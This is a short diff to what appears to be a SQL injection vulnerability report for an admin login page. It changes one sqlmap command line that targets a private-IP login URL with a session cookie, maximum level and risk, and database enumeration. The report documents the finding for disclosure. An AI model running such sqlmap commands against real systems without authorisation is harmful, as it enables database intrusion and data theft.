@@ -53,7 +53,7 @@ Parameter: username (POST)
 
 ### The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:
 ```
-python sqlmap.py -u "http://192.168.75.230:8080/admin/admin_login.php" --data="username=1&password=1&submit=Login" --cookie="Cookie: PHPSESSID=2vlp63ah40dpfu1essnne5at9c" --batch --level=5 --risk=3 --random-agent --dbms=mysql --dbs
+sqlmap -u "http://192.168.75.230:8080/admin/admin_login.php" --data="username=1&password=1&submit=Login" --cookie="Cookie: PHPSESSID=2vlp63ah40dpfu1essnne5at9c" --batch --level=5 --risk=3 --random-agent --dbms=mysql --dbs
 ```
 <img src="./image/2.jpg" style="zoom:150%;" />
 
